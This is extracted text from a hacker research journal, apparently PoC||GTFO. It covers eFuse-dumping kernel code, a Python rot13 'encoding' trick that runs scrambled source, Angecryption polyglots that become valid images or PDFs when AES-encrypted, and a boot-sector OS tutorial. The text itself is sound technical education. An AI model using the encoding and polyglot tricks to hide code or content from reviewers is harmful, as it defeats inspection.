stored_data_temp = r e a d b _ r e l a x e d ( (QFPROM_BASE_MAP_ADDRESS + i ) ) ;
if
( ! stored_data_temp ) {
p r _ i n f o ( "m0nk␣−>␣ l o c a t i o n : ␣ , ␣ b y t e ␣ number : ␣%i , ␣ has ␣ no ␣ v a l i d ␣ v a l u e \n" , i ) ;
base_fuse_map [ i ] = 0 ;
} else {
p r _ i n f o ( " \tm0nk␣−>␣ l o c a t i o n : ␣ , ␣ b y t e ␣ number : ␣%i , ␣ ha s ␣ v a l u e : ␣%x\n" ,
i , stored_data_temp ) ;
b a s e _ f u s e _ v a l u e s [ i ] = stored_data_temp ;
base_fuse_map [ i ] = 1 ;
}
7 Thanks
Mudge!
33}
stored_data_temp = 0 ;
//−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
// S t a g e 2 : H i t t i n g t h e eFuse shadow memory ( t h i s i s s u p p o s e d t o work )
//−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
// f o r ( i = 0 ; i < QFPROM_FUSE_BLOB_SIZE; i ++) {
//
stored_data_temp = r e a d b _ r e l a x e d ( (QFPROM_SHADOW_MAP_ADDRESS + i ) ) ;
//
i f ( ! stored_data_temp ) {
//
pr_info ("m0nk −> l o c a t i o n : , b y t e number : %i , has no v a l i d v a l u e \n " , i ) ;
//
shadow_fuse_map [ i ] = 0 ;
//
}else{
//
pr_info ("\ tm0nk −> l o c a t i o n : , b y t e number : %i , has v a l u e : %x \n " , i , stored_data_temp ) ;
//
shadow_fuse_values [ i ] = stored_data_temp ;
//
shadow_fuse_map [ i ] = 1 ;
//
}
// }
return 0 ;
}
//−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
// Now we can crawl , and we do so b l i n d l y
//−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
s t a t i c i n t dump_the_things ( void ) {
// This s h o u l d g e t p o p u l a t e d w i t h code t o dump t h e a r r a y s t o a f i l e
uint32_t i ;
for
o f f l i n e use .
p r _ i n f o ( " \n\nm0nk− >␣Known␣QF − PROM␣ D i r e c t ␣ C o n t e n t s ! \ n" ) ;
f o r ( i = 0 ; i < QFPROM_FUSE_BLOB_SIZE; i ++) {
i f ( base_fuse_map [ i ] == 1 )
p r _ i n f o ( "m0nk␣−>␣ o f f s e t : ␣ 0x%x␣(% i ) , ␣ ha s ␣ v a l u e : ␣ 0x%x␣(% i ) \ n" ,
i , i , base_fuse_values [ i ] , base_fuse_values [ i ] ) ;
}
// pr_info ("\ n\nm0nk− > Known QF − PROM Shadow Contents ! \ n " ) ;
// f o r ( i = 0 ; i < QFPROM_FUSE_BLOB_SIZE; i ++) {
//
i f ( shadow_fuse_map [ i ] == 1)
//
pr_info ("m0nk −> o f f s e t : 0%xx , has v a l u e : 0 x%x (% i )\ n " ,
//
i , shadow_fuse_values [ i ] , shadow_fuse_values [ i ] ) ;
// }
return 0 ;
}
Writing a fuse is slightly more complex, but basically amounts to pushing a voltage to the eFuse for a
specified duration in order for the fuse to blow. This feature is included in my complete fuse introspection
tool, which will be available through Github soon. 8
Have fun, break with caution and enjoy.
8 https://github.com/monk-dot/DefusingTheDragon
3410
Tales of Python’s Encoding
by Frederik Braun
Many beginners of Python have suffered at the hand of the almighty SyntaxError. One of the less
frequently seen, yet still not uncommon instances is something like the following, which appears when
Unicode or other non-ASCII characters are used in a Python script.
SyntaxError: Non-ASCII character ... in ..., but no encoding declared;
see http://www.python.org/peps/pep-0263.html for details
The common solution to this error is to place this magic comment as the first or second line of your
Python script. This tells the interpreter that the script is written in UTF8, so that it can properly parse the
file.
# encoding: utf-8
I have stumbled upon the following hack many times, but I have yet to see a complete write-up in our
circles. It saddens me that I can’t correctly attribute this trick to a specific neighbor, as I have forgotten
who originally introduced me to this hackery. But hackery it is.
10.1
The background
Each October, the neighborly FluxFingers team hosts hack.lu’s CTF competition in Luxembourg. Just last
year, I created a tiny challenge for this CTF that consists of a single file called “packed” which was supposed
to contain some juicy data. As with every decent CTF task, it has been written up on a few blogs. To my
distress, none of those summaries contains the full solution.
The challenge was in identifying the hidden content of the file, of which there were three. Using the liberal
interpretation of the PDF format, 9 one could place a document at the end of a Python script, enclosed in
multi-line string quotes. 10
The Python script itself was surrounded by weird unprintable characters that make rendering in command
line tools like less or cat rather unenjoyable. What most people identified was an encoding hint.
00000a0:
00000b0:
...
0000180:
0000190:
0c0c 0c0c 0c0c 0c0c 2364 6973 6162 6c65
642d 656e 636f 6469 6e67 3a09 5f72 6f74 ........#disable
d-encoding:._rot
5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f
3133 037c 1716 0803 2010 1403 1e1b 1511 ________________
13.|.... .......
Despite the unprintables, the long range of underscores didn’t really fend off any serious adventurer. The
following content therefore had to be rot13 decoded. The rest of the challenge made up a typical crackme.
Hoping that the reader is entertained by a puzzle like this, the remaining parts of that crackme will be left
as an exercise.
The real trick was sadly never discovered by any participant of the CTF. The file itself was not a PDF that
contained a Python script, but a python script that contained a PDF. The whole file is actually executable
with your python interpreter!
Due to this hideous encoding hint, which is better known as a magic comment, 11 the python interpreter
will fetch the codec’s name using a quite liberal regex to accept typical editor settings, such as “vim: set
fileencoding=foo” or “-*- coding: foo”. With this codec name, the interpreter will now import a python file
with the matching name 12 and use it to modify the existing code on the fly.
9 As
seems to be mentioned in every PoCkGTFO issue, the header doesn’t need to appear exactly at the file’s beginning, but
within the first 1,024 bytes.
10 """This is a multiline Python string.
It has three quotes."""
11 See Python PEP 0263, Defining Python Source Code Encodings
12 See /usr/lib/python2.7/encoding/__init__.py near line 99.
3510.2
The PoC
Recognizing that cevag is the Rot13 encoding of Python’s print command, it’s easy to test this strange
behavior.
% cat poc.py
#! /usr/bin/python
#encoding: rot13
cevag ’Hello World’
% ./poc.py
Hello World
%
10.3
Caveats
Sadly, this only works in Python versions 2.X, starting with 2.5. My current test with Python 3.3 yields first
an unknown encoding error (the “rot13” alias has sadly been removed, so that only “rot-13” and “rot_13”
could work). But Python 3 also distinguishes strings from bytearrays, which leads to type errors when
trying this PoC in general. Perhaps rot_13.py in the python distribution might itself be broken?
There are numerous other formats to be found in the encodings directory, such as ZIP, BZip2 and Base64,
but I’ve been unable to make them work. Most lead to padding and similar errors, but perhaps a clever
reader can make them work.
And with this, I close the chapter of Python encoding stories. TGSB!
3611
A Binary Magic Trick, Angecryption
by Ange Albertini and Jean-Philippe Aumasson
This PDF file, the one that you are reading right now, contains a magic trick. If you encrypt it with AES
in CBC mode, it becomes a PNG image! This brief article will teach you how to perform this trick on your
own files, combining PDF, JPEG, and PNG files that gracefully saunter across cryptographic boundaries.
Given two arbitrary documents S (source) and T (target), we will create a first file F 1 that gets rendered
the same as S and a second file F 2 = AES K,IV (F 1 ) that gets rendered the same as T by respective format
viewers. We’ll use the standard AES-128 algorithm in CBC mode, which is proven to be semantically secure 13
when used with a random IV .
In other words, any file encrypted with AES-CBC should look like random garbage, that is, the encryption
process should destroy all structure of the original file. Like all good magicians, we will cheat a bit, but I
tell you three times that if you encrypt this PDF with an IV of 5B F0 15 E2 04 8C E3 D3 8C 3A 97 E7
8B 79 5B C1 and a key of “Manul Laphroaig!”, you will get a valid PNG file.
11.1
When the Format Payload can Start at Any Offset
First let’s pick a format for the file F 2 that doesn’t require its payload to start right at offset 0. Such formats
include ZIP, Rar, 7z, etc. The principle is simple:
First we encrypt S, and get apparent garbage Enc(S). Then we create F 2 by appending T to Enc(S), which
will be padded, and we decrypt the whole file to get F 1 . Thus F 1 is S with apparent garbage appended, and
F 2 is T with apparent garbage prepended.
This method will also work for short enough S and formats such as PDF that may begin within a certain
limited distance of offset 0, but not at arbitrary distance.
11.2
Formats Starting at Offset 0
We had it easy with formats that allowed some or any amount of garbage at the start of a file. However,
most formats mandate that their files being with a magic signature at offset 0. Therefore, to make the first
blocks of F 1 and F 2 meaningful both before and after encryption, we need some way to control AES output.
Specifically, we will abuse our ability to pick the Initialization Vector (IV) to control exactly what the first
block of F 1 encrypts to.
In CBC mode, the first 16-byte ciphertext block C 0 is computed from the first plaintext block P 0 and
the 16-byte IV as
C 0 = Enc K (P 0 ⊕ IV )
where K is the key and Enc is AES. Thus we have Dec K (C 0 ) = P 0 ⊕ IV and we can solve for
IV = Dec K (C 0 ) ⊕ P 0
As a consequence, regardless of the actual key, we can easily choose an IV such that the first 16 bytes of
F 1 encrypt to the first 16 bytes of F 2 , for any fixed values of those 2×16 bytes. The property is obviously
preserved when CBC chaining is used for the subsequent blocks, as the first block remains unchanged.
So now we have a direct AES encryption that will let us control the first 16 bytes of F 2 .
Now that we control the first block, we’re left with a new problem. This trick of choosing the IV to force
the encrypted contents of the first block won’t work for latter blocks, and they will be garbage beyond our
control.
13 “IND-CPA”
in cryptographers’ jargon.
37So how do we turn this garbage into valid content (that renders as T )? We don’t. Instead, we use the
contents of the first block to cause the parser to skip over the garbage blocks, until it lands at the ending
region which we control. This trick is similar to the one I used to combine a PDF and JPEG in Section 3,
and it’s a damned important trick to keep handy for other purposes.
Let’s take a look at some specific file formats and how to implement them with Angecryption.
11.2.1
Joint Photographic Experts Group
According to specification, 14 JPEG files start with a signature FF D8 called “Start Of Image” (SOI) and
consist of chunks called segments. Segments are stored as
hmarker : 2ihvariablesize(data + 2) : 2ihdata :?i
In a typical JPEG file the SOI is followed by the APP0 segment that contains the JFIF signature, with
marker FF E0. The APP0 segment is usually 16 bytes.
So we need to insert a COMment segment (marker FF FE) right after the SOI. As we know the size of S
in advance, we can already determine the start of F 2 , and then the AES-CBC IV. T will then contain the
APP0 segment, and its usual JPEG content.
11.2.2
Portable Network Graphics
PNG files are similar to JPEGs, except that their chunks contain a checksum, and their size structure is four
bytes long.
A PNG file starts with the signature “\x89PNG\x0D\x0A\x1A\x0A” and is then structured in TLV chunks.
hlength(data) : 4ihchunktype : 4ihchunkdata :?ihcrc(chunktype + chunkdata) : 4i
These are typically located right after the signature, where an IHDR (ImageHeaDeR) chunk usually starts.
For F 2 to be valid, we need to start with a chunk that will cover the len(S) − 16 garbage bytes of Enc(S).
We can give it any lowercase chunk type, 15 and luckily, at the end of the chunk type, we’re right at the limit
of 16 bytes, so no brute forcing of the next encrypted block is required.
At that point of F 2 the uncontrolled garbage portion may start. We then calculate its checksum, append
it, then resume with all the chunks coming from T . Our F 2 is now composed of (1) a PNG signature, (2) a
single dummy chunk containing Enc(S), and (3) the T chunks that make up the meaningful image. This is
a valid PNG file.
11.2.3
Portable Document Format
PDF may include dummy objects of any length. However, we need a trick to make the signature and the
first object declaration fit in the first 16 bytes.
A PDF starts with “%PDF-1.5” signature. This signature has to be entirely within the first 1024 bytes
of the file, and everything after the signature must be a valid PDF file. Because the uncontrolled portion of
the file appears as a lot of garbage after the first block, it needs to be enclosed in a dummy stream object.
14 JPEG
File Interchange Format Version 1.02, Sept. 1, 1992
the first letter in the type field of a PNG block is lowercase, then that chunk will be ignored by the viewer, which
interprets it as a custom dummy block.
15 If
381 0 obj
<< >>
stream
Unfortunately, the PDF signature followed by a standard stream object declaration take up 30 bytes.
Choosing the IV only gives us 16 bytes to play with, so we must somehow compress the PDF header and
opening of a stream object into slightly more than half the space it would normally take.
Our trick will be to truncate both the signature and the object declaration by inserting null bytes
“%PDF-\0obj\0stream”. The signature is truncated by a null byte, 16 and we also omit the object reference
and generation, and the object dictionary. Luckily, this reduced form takes exactly 16 bytes, and still works!
Now the uncontrolled remainder of Enc(S) will be ignored as a valid but unused stream object. We then
only need the start of T to close that object, and then T can be a valid PDF. So F 2 is a valid PDF file,
showing T ’s content.
11.3
Conclusion
Provided that the format of our source file tolerates some appended garbage, and that the file itself is not
too big, we can encrypt it to a valid PNG, JPEG or PDF.
This same technique can work for other ciphers and file formats. Any block cipher will do, provided that
its standard block size is big enough to fit the target header and a dummy chunk start. This means we need
six bytes for JPEG, sixteen bytes for PDF and PNG.
An older cipher such as Triple-DES, which has blocks of eight bytes, can still be used to encrypt to JPEG.
ThreeFish, which can have a block size of 64 bytes, can even be used to encrypt a PE. The first block would
be large enough to fit the entire DOS_HEADER, which allows you to relocate the NT_Headers wherever you
like, up to 0x0FFF_FFFF.
So you could make a valid WAV file that, when encrypted with AES, gives you a valid PDF. That same
file, when encrypted with Triple-DES, gives you a JPEG. Furthermore, when decrypted with ThreeFish,
that file would give you a PE. You can also chain stages of encryption, as long as the size requirements are
taken care of.
16 This
part of the trick was learned from Tavis Ormandy.
3912
A Call for PoC
by Rt. Revd. Dr.Pastor Manul Laphroaig
Howdy, neighbor! Is that a fresh new PoC you are hugging so close? Don’t stifle it, neighbor, it’s time
for it to see the world, and what better place to do it than from the pages of the famed International Journal
of PoC or GTFO? It will be in a merry company of other PoCs big and small, bit-level and byte-level, raw
binary or otherwise, C, Python, Assembly, hexdump or any other language. But wait, there’s more—our
editors will groom it for you, and dress it in the best Sunday clothes of proper church English. And when it
looks proudly back at you from these pages, in the company of its new friends, won’t that make you proud?
So set that little PoC free, neighbor, and let it come to me, pastor@phrack org!
12.1
PoC Contributions
Do this: Write an email telling our editors how to do reproduce *ONE* clever, technical trick from your
research.
Like an email, keep it short. Like an email, you should assume that we already know more than a bit
about hacking, and that we’ll be insulted or—WORSE!—that we’ll be bored if you include a long tutorial
where a quick reminder would do. Don’t try to make it thorough or broad.
Do pick one quick, clever low-level trick and explain it in a few pages. Teach me how to patch 81-column
support into CMD.EXE; teach me how to make a Turing-machine out of twigs and mud; or, teach me how
to make a randomized bingo card as a PDF that never renders the same way twice. Show me how to hide
steganographic messages with METAFONT so that a trained reader can pick out from the paper copy, or
how to decode downlink data from the Voyager spacecraft. Don’t tell me that it’s possible; rather, teach me
how to do it myself with the absolute minimum of formality and bullshit.
Like an email, we expect informal (or faux-biblical) language and hand-sketched diagrams. Write it in
a single sitting, and leave any editing for your poor preacherman to do over a bottle of scotch. Send this
to pastor@phrack.org and hope that the neighborly Phrack folks—praise be to them!—aren’t man-in-the-
middling our submission process.
You can expect PoCkGTFO 0x04, our fifth release, to appear in print soon at a conference of good
neighbors. We’ve not yet decided whether to include crayons, but you can be damned sure that it’ll be a
good read.
40TRACT
de la
SOCIÉTÉ SECRÈTE
de
POC k GTFO
sur
L’ÉVANGILE DES MACHINES ÉTRANGES
et autres
SUJETS TECHNIQUES
par le prédicateur
PASTEUR MANUL LAPHROAIG
pastor@phrack org
27 June 2014
MONTRÉAL:
Published by the Tract Association of POCkGTFO and Friends,
And to be Had from Their Street Prophet,
Laphroaig, at the Corner of
Rue Ste-Catherine and Rue Jeanne-Mance
Or on the Intertubes as pocorgtfo04.pdf.
No 0x04 Самиздат
1Legal Note: Permission to use all or part of this work for personal, classroom or any other use is NOT granted
unless you make a copy and pass it to a neighbor without fee. Just as Saint Leibowitz of Utah and his merry band of
bookleggers defended their hoard from the bonfires of the Simplification, you might one day need to defend your seeds
of 0day from Chris Soghoian and the ACLU’s—and who could imagine ACLU in that corner?—Anti-0day-Initiative.
Best of luck!
Reprints: This issue is published through samizdat as pocorgtfo04.pdf. While the recently successful Auern-
heimer appeal didn’t explicitly legalize enumerating integers, you might now feel safe in counting upward from
pocorgtfo00.pdf to get our other issues. Those who aren’t as brave can run unzip pocorgtfo04.pdf without fear
of legal repercussions.
Technical Note: Like many of our prior issues, this one is a polyglot. As a PDF, it renders to the document
that you are now reading. As a ZIP, it contains our prior issues and some of that good, old-timey mythology. As a
Truecrypt volume, its contents is a mystery, but “123456” might not have been the best choice of a password.
Not a .txt: We’ve been repeatedly asked to release as a 7-bit clean ASCII textfile, and while we too love textfiles,
we find this to be terribly unneighborly. Do you motherless children show up at a concert to scream, “Shut up and
play the single!”? Verily, I tell you, don’t be unneighborly! When you show up at a concert, scream “Play the song
that you practiced!” and enjoy the show!
Boss
Dept. of PHY
Ethics Advisor
Poet Laureate
Funky File Formats Polyglot
Minister of Spargelzeit Weights and Measures
2
Reverend Doctor Pastor Manul Laphroaig
Michael Ossmann
The Grugq
Ben Nagy
Ange Albertini
FX1
Call to Worship
Neighbors, please join me in reading this fifth issue of the International Journal of Proof of Concept or Get
the Fuck Out, a friendly little collection of articles for ladies and gentlemen of distinguished ability and taste
in the field of software exploitation and the worship of weird machines. If you are missing the first four issues,
we the editors suggest pirating them from the usual locations, or on paper from a neighbor who picked up a
copy of the first in Vegas, the second in São Paulo, the third in Hamburg, or the fourth in Heidelberg. This
fifth issue is written for the fine neighbors at Recon in Montréal.
We begin in Section 2, where Pastor Laphroaig presents his first epistle concerning the bountiful seeds of
0day, from which all clever and nifty things come. The preacherman tells us that the mechanism—not the
target!—is what distinguishes the interesting exploits from the mundane.
In Section 3, Shikhin Sethi presents the first in a series of articles on the practical workings of X86
operating systems. You’ll remember him from his prior boot sectors, such as Tetranglix in PoCkGTFO 3:8
and Wódscipe, a 512-byte Integrated Development Environment for Brainfuck and ///. This installment
describes the A20 address line, virtual memory, and recursive page mapping.
The first of two 6502 articles in this issue, Section 4 describes Peter Ferrie’s patch to rebuild Prince of
Persia to remove copy protection and fit on a single, two-sided 16-sector floppy disk. (Artwork in this section
advertises the brilliant novella Prince of Gosplan by Виктор Пелевин. You should read it.)
The author of Section 5 provides a quick introduction to fuzzing with his rewrite of Sergey Bratus and
Travis Goodspeed’s Facedancer framework for USB device emulation.
In Section 6, Natalie Silvanovich continues the Tamagotchi hacking that you read about in PoCkGTFO 2:4.
This time, there’s no software vulnerability to exploit; instead, she loads shellcode into the chip’s memory
and glitches the living hell out of its power supply with an AVR. Most of the time, this causes a crash, but
when the dice are rolled right, the program counter lands on the NOP sled and the shellcode is executed!
In Section 7, Evan Sultanik presents a provably plausibly deniable cryptosystem, one in which the ci-
phertext can decrypt to multiple plaintexts, but also that the file’s creator can deny ever having intended
for a particular plaintext to be present.
In Section 8, Deviant Ollam shares a forgotten trick for modifying normal locks with a tap and die to
make them pick resistant.
In Section 9, Travis Goodspeed presents an introductory tutorial on chip decapsulation and photography.
Please research and follow safety procedures, as chemical accidents hurt a lot more than a core dump.
In Section 10, Colin O’Flynn exploits a pin-protected external hard disk and a popular AVR bootloader
using timing and simple power analysis.
In Sections 11 and 12, our own Funky File Formats Polygot Ange Albertini shows how to hide a TrueCrypt
volume in a perfectly valid PDF file so that PDF readers don’t see it, and how to attach feelies ZIPs to PDF
files so that Adobe tools do see them as legitimate PDF attachments. (Yes, Virginia, there is such a thing
as a PDF attachment!) 1
In Section 13, our Poet Laureate Ben Nagy presents his Ode to ECB accompanied by one of Natalie
Silvanovich’s brilliant public service announcements. Don’t let your penguin show!
Finally, in Section 14, we do what churches do best and pass around the donation plate. Please contribute
any nifty proofs of concept so that the rest of us can be enlightened!
poCoRgtfO
One last thing before you dig in. This issue is brought to you by Merchants of PoC. Are you a Merchant
of PoC, neighbor? Have you what it takes to follow the Great PoC Road, bringing the exotic treasures of
Far and Misunderstood Parts to your neighborhoods? Or are you a Merchant of Turing-complete Death and
Cyber-bullets? Fret not, neighbor: the only Merchants we fear are the Merchants of Ignorance, who seek to
ban or control what they don’t understand, and know not the harm they cause to the trade of Knowledge
and Understanding.
1 So
now you can put your attachments inside your attachments—but I digress. –PML
32
First Epistle Concerning the Bountiful Seeds of 0Day
by Manul Laphroaig, Merchant of Dead Trees
Dearly Beloved,
Are the last days of 0day upon us? Is 0day becoming so sparse as to grace the very few, no matter how
many of the faithful strive for its glory? Not so.
For what is the seed of 0day? Is it not a nugget of understanding what those of little faith ignore as
humdrum? Is it not liberating the computing power of mechanisms unnoticed by those who use them daily?
Is it not programming of machines presumed to be set in stone or silicon?
Verily, when the developer herds understand the tools that drive them to their cubicled pastures every
day, then shall the 0day be depleted—but not before. Verily, when every tender of academic pigeonholes
reads the papers he reviews and demands to see their source, then might the 0day begin to deplete—but not
before.
For how can the sum of programs grow faster than St. Moore foresaw without increasing the sum of
0day? Have we prophets and holy ones who can cure the evil of using tools without understanding? Have
layers of abstractions stopped breeding blind reliance? Verily, on such sand new castles are being erected
even now.
So, beloved brethren, seek after 0day wherever and whenever the idolaters say “this just works” or “you
don’t need to understand this to write great code” or yet “write once, run anywhere.” Most of all, look for it
where the holy PEEK and POKE are withheld from those who crave them—for no righteousness can survive
there, and the blind there are leading the blind to the pits of eternal pwnage.
Similarly, pay no attention to the target of an exploit. The mechanism, not target, is where an exploit’s
cleverness lies. Verily, the target, the pwnage, and the press release are all just a side show. When the
neighbors ask you about BYOD, rebuke them like this: “It is not my job to sell you a damned iPad!”
So preach this good news to all your neighbors, and to their neighbors:
If the 0day in your familiar pastures dwindles, despair not! Rather, bestir yourself to where
programmers are led astray from the sacred Assembly, neither understanding what their pro-
gramming languages compile to, not asking to see how their data is stored or transmitted in the
true bits of the wire. For those who follow their computation through the layers shall gain 0day
and pwn, and those who say “we trust in our APIs, in our proofs, and in our memory models and
need not burden ourselves with confusing engineering detail that has no scientific value anyhow”
shall surely provide an abundance of 0day and pwnage sufficient for all of us.
Go now in peace and pwnage,
—PML
43
This OS is a Boot Sector
by Shikhin Sethi, Merchant of 3.5” Niftiness
Writing an Operating System is easy. Explaining how to
write one isn’t. Most introductory articles on the same obfus-
cate the workings of the necessary components of an OS with
design paradigms the writers feel best complement the OS. This
article, the first in my PoCkGTFO series on just how a modern
OS works, is different—it tries to properly, yet succinctly, ex-
plain all the requisite components of an OS—in 512 bytes per
article.
The magic begins with the processor starting execution on
reset at the linear address 0xFFFFFFF0. This location contains
a jump to the Basic Input/Output System (BIOS) code, which
starts with the Power On Self Test (POST), followed by ini-
tialization of all requisite devices. In a predetermined order,
the BIOS then checks for any bootable storage medium in the
system. Except for optical drives, a bootable disk is indicated
via a 16-bit 0xAA55 identifier at the 510-byte mark (end of
first 512-byte sector). 2
If a bootable medium is found, the first sector is loaded at
the linear address 0x7C00 and jumped to. If none is found, the
BIOS lovingly displays “Operating System not found.” 3
3.1
Real Mode
The first ancestor of today’s x86 architecture was the 8086, introduced in 1978. The processor featured no
memory protection or privilege levels. By 1982, Intel had designed and released the 80286, which featured
hardware-level memory protection mechanisms, among other features. However, to maintain backward
compatibility, the processor started in a mode compatible with the 8086 and 80186, known as real mode.
(Feature wise, the mode lacks realness on all accounts.)
Real mode features a 20-bit address space and limited segmentation. The mode featuring memory
protection and a larger address space was called the protected mode.
Note that the 16-bit protected mode introduced with the 80286 was enhanced with the 80386 to form
32-bit protected mode. We will be targeting only the latter.
3.2
Segmentation
The 8086 had 16-bit registers, which were used to address memory. However, its address bus was 20-bit.
To take advantage of its full width and address the entire 1MiB physical address space, the scheme of
‘segmentation’ was devised.
In real-mode segmentation, 16-bit segment registers are used to derive the linear address. The registers
CS, DS, SS, and ES point to the current code segment, data segment, stack segment respectively, with ES
being an ‘extra’ segment.
The 80386 introduced the FS and GS registers as two more additional segment registers.
2 0xAA55 is representable as 0b1010101001010101. The alternating bit pattern, with 0x55 being an inversion of 0xAA, was
taken as an insurance against even extreme controller failure. The same identifier is also used in other parts of the BIOS
interface.
3 There is no deep reason behind 0x7C00 being the load address. This is how programming usually works (and standards
proliferate).
5The 16-bit segment selector in the segment register yields the 16 significant bits of the 20-bit linear
address. A 16-bit offset is added to this segment selector to yield the linear address. Thus, an address of the
form:
(Segment) : (Of f set)
can be interpreted as,
(Segment << 8) + Of f set
This, however, can yield multiple (Segment):(Offset) pairs for a linear address. This problem persists
during boot time, when the BIOS hands over control to the linear address 0x7C00, which can be represented
as either 0x0000:0x7C00 or 0x07C0:0x0000. (Even the very first address the processor starts executing
at reset is similarly ambiguous. In fact, 8086 and 80286 placed different values into CS and IP at reset,
0xFFFF:0x0000 and 0xF000:0xFFF0 respectively.) Therefore, our bootloader starts with a far jump to reset
CS explicitly, after which it initializes other segment registers and the stack.
; 16− b i t , 0x7C00 b a s e d c o d e .
org 0x7C00
b i t s 16
; Far jump , r e s e t CS t o 0 x 0 0 0 0 .
; CS cannot be s e t v i a a ’ mov ’ , and r e q u i r e s a f a r jump.
start :
jmp 0 x0000 : seg_setup
seg_setup :
xor ax , ax
mov ds , ax
mov ss , ax
Stack
The x86 also offers a hardware stack (full-descending). SS:(E)SP points to the top of the stack, and the
instructions push/pop directly deal with it.
; S t a r t t h e s t a c k from b e n e a t h s t a r t (0 x7C00 ) .
mov esp , s t a r t
Flags
A direction flag in the (E)FLAGS register controls whether string operations decrement or increment their
source/destination registers. We clear this flag explicitly, which implies that all source/destination registers
should be incremented after string operations.
; Clear d i r e c t i o n f l a g .
cld
The A20 Line
On the original 8086, the last segment started at 0xFFFF0 (segment selector = 0xFFFF). Thus, with offset
greater than 0x000F, one could potentially access memory beyond the 1MiB mark. However, having only
20 addressing lines, such addresses wrapped around to the 0MiB mark. An access of 0xFFFF:0x0010 would
yield an access to 0x0000 (wrapped around from 0x10000) on the 8086.
6The 80286, however, featured twenty-four address bits. Delighted hackers, on the other hand, had already
exploited the wrap-around of addresses on the 80(1)86 to its fullest extent. Intel maintained backwards
compatibility by introducing a software programmable gate to enable or disable the twenty-first addressing
line (called the A20 line), known as the A20 gate. The A20 gate was disabled on-boot by the BIOS.
; Read t h e 0 x92 p o r t .
in al , 0 x92
; Enable f a s t A20.
or al , 2
; B i t 0 i s used t o s p e c i f y f a s t r e s e t , ’ and ’ i t o u t .
and al , 0xFE
out 0 x92 , a l
3.3
Protected mode
Segmentation Revisited
The introduction of protected mode featured an extension to the segmentation model, to allow rudimentary
memory protection. With that extension, each segment register contains an offset into a table, known as
the global descriptor table (GDT). The entries in the table describe the segment base, limit, and other
attributes—including whether code in the segment can be executed, and what privilege level(s) can access
the segment.
At the same time, Intel introduced paging. The latter was much easier to use for fine-grained control
and different processes, and quickly superseded segmentation. All major operating systems setup ‘linear’
segmentation where each segment is a one-on-one mapping of the physical address space, after which they
ignore segmentation.
As paging was extended to cover most cases, segmentation was left with only an empty shell of its former
glory. However, it inspired OpenWall’s non-executable stack patch and PaX’s SEGMEXEC—both of which
couldn’t have been implemented with vanilla x86 paging.
Note that the new segment selectors are only valid for 32-bit protected mode, and we’ll reload them after
the switch to that mode.
; Disable interrupts.
cli
; Load t h e GDTR − t h e p o i n t e r t o t h e GDT.
lgdt [ g d t r ]
; The GDT.
gdt :
; The f i r s t e n t r y i n t h e GDT i s s u p p o s e d t o be a
; n u l l e n t r y , b u t we ’ l l s u b s t i t u t e i t w i t h t h e
; ’ pointer to gdt ’ .
gdtr :
; S i z e o f GDT − 1 .
; 3 e n t r i e s , each 8 b y t e s .
dw ( 0 x8 ∗ 3 ) − 1
; P o i n t e r t o GDT.
dd gdt
; Make i t 8 b y t e s .
dw 0 x0000
; The code e n t r y .
dw 0xFFFF
; F i r s t 16− b i t s o f l i m i t .
7dw
db
db
db
0 x0000
0 x00
0x9A
0xCF
db 0 x00
;
;
;
;
;
;
;
;
;
;
;
F i r s t 16− b i t s o f b a s e .
Next 8− b i t s o f b a s e .
Read/ w r i t a b l e , e x e c u t a b l e , p r e s e n t .
0 b11001111.
The l e a s t s i g n i f i c a n t f o u r b i t s a r e n e x t f o u r b i t s o f
limit.
The most s i g n i f i c a n t two b i t s s p e c i f y t h a t t h i s i s f o r
32− b i t p r o t e c t e d mode , and t h a t t h e 20− b i t l i m i t i s i n
4KiB b l o c k s . Thus , t h e 20− b i t 0 b11111111111111111111
s p e c i f i e s a l i m i t o f 0xFFFFFFFF.
L a s t 8− b i t s o f b a s e .
; The d a t a e n t r y .
dw 0xFFFF , 0 x0000
db 0 x00
db 0 x92
; Read/ w r i t a b l e , p r e s e n t .
db 0xCF
db 0 x00
No More Real (Mode)
The switch to protected mode is relatively easy, involving merely setting a bit in the CR0 register and then
reloading the CS register to specify 32-bit code.
mov eax , cr0
or eax , 1
; Set the p ro t ec t io n enable b i t .
mov cr0 , eax
jmp 0 x08 : protected_mode
b i t s 32
protected_mode :
; S e l e c t o r 0 x10 i s t h e d a t a s e l e c t o r o f f s e t .
mov ax , 0 x10
mov ds , ax
mov es , ax
mov ss , ax
3.4
Paging
“Paging is called paging because you need to draw it on pages in your notebook to succeed at it.”
—Jonas ‘Sortie’ Termansen
Virtual Memory
The concept of virtual memory is to have per-process virtual address spaces, with particular virtual ad-
dresses automatically mapped onto physical addresses for each process. Compared with segmentation, such
a technique offers the illusion of contiguous physical memory and fine-grained privilege control.
To brush up the concept of virtual memory, follow along with the hand-drawn illustration in Figure 1.
Virtual Memory (x86)
On the x86, the task of mapping virtual addresses to physical addresses is managed via two tables: the page
directory and the page table. Each page directory contains 1024 32-bit entries, with each entry pointing to a
8Figure 1: Virtual Memory
page table. Each page table contains 1024 32-bit entries, each pointing to a 4KiB physical frame. The page
table in entirety addresses 4MiB of physical address space. The page directory, thus, in entirety addresses
4GiB of physical address space, the limit of a 32-bit address space.
The first page table pointed to by the page directory maps the first 4MiB of the virtual address space to
physical addresses, the next to the next 4MiB, and so on.
The address of the page directory is loaded into a special register, the CR3.
Figure 2: X86 Paging
; 0 x8000 w i l l be our page d i r e c t o r y , 0 x9000 w i l l be t h e
; page t a b l e .
; From 0 x8000 , c l e a r one 0 x1000−l o n g f r a m e .
mov edi , 0 x8000
mov cr3 , edi
xor eax , eax
mov ecx , ( 0 x1000 / 4 )
; S t o r e EAX − ECX numbers o f t i m e .
9rep stosd
; The page t a b l e a d d r e s s , p r e s e n t , read / w r i t e .
mov dword [ edi − 0 x1000 ] , 0 x9000 | ( 1 << 0 ) | ( 1 << 1 )
; Map t h e f i r s t 4MiB onto i t s e l f .
; Each e n t r y i s p r e s e n t , read / w r i t e .
or eax , ( 1 << 0 ) | ( 1 << 1 )
.setup_pagetable :
stosd
add eax , 0 x1000
; Go t o n e x t p h y s i c a l a d d r e s s .
